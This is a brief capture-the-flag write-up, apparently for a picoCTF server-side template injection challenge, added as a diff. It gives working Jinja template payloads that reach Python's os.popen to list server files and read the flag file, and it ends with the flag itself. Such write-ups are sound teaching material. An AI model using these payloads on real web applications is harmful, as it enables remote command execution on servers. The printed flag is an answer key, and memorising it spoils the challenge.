@@ -1,0 +1,7 @@
+{{ config.__class__.from_envvar.__globals__.__builtins__.__import__('os').popen('ls').read() }}
+
+than you can see various files in the server , just change popen('cat flag') to read out the flag content
+
+{{ config.__class__.from_envvar.__globals__.__builtins__.__import__('os').popen('cat flag').read() }}
+
+picoCTF{s4rv3r_s1d3_t3mp14t3_1nj3ct10n5_4r3_c001_09365533}
